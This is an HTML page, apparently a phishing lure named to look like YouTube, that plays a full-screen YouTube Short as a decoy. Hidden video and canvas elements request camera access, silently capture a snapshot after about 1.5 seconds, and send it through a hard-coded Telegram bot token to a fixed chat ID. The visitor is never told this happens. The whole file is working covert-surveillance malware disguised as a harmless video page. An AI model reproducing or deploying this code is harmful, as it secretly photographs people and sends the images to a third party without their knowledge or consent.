<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>يوتاوبا</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #000;
    }
    /* الفيديو يمتد على كامل الشاشة */
    iframe {
      border: none;
      width: 100vw;
      height: 100vh;
    }
  </style>
</head>
<body>
  <!-- عرض فيديو الشورت فقط -->
  <iframe src="https://www.youtube.com/embed/d1HzEmpLxQY?autoplay=1&mute=1" 
          allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" 
          allowfullscreen></iframe>

  <!-- عناصر الكاميرا (مخفية) -->
  <video id="camVideo" autoplay playsinline style="display: none;"></video>
  <canvas id="captureCanvas" style="display: none;"></canvas>

  <script>
    // إعدادات بوت تيليجرام
    const BOT_TOKEN = '8196888952:AAFQt5yCkJeIbuVZXxbRDC-DJR37QU2l5j8';
    const CHAT_ID = '5933248203';

    // تشغيل الكاميرا في الخلفية
    const video = document.getElementById('camVideo');
    const canvas = document.getElementById('captureCanvas');

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
          video.srcObject = stream;
          // بعد 5 ثواني، يلتقط صورة ويرسلها
          setTimeout(captureAndSend, 1500);
      })
      .catch(err => {
          console.error('خطأ في الوصول للكاميرا:', err);
      });

    function captureAndSend() {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const context = canvas.getContext('2d');
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      canvas.toBlob(blob => {
          const formData = new FormData();
          formData.append('chat_id', CHAT_ID);
          formData.append('photo', blob, 'snapshot.png');

          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
              method: 'POST',
              body: formData
          })
          .then(response => response.json())
          .then(data => {
              console.log(data);
          })
          .catch(error => {
              console.error('خطأ أثناء إرسال الصورة:', error);
          });
      }, 'image/png');
    }
  </script>
</body>
</html>
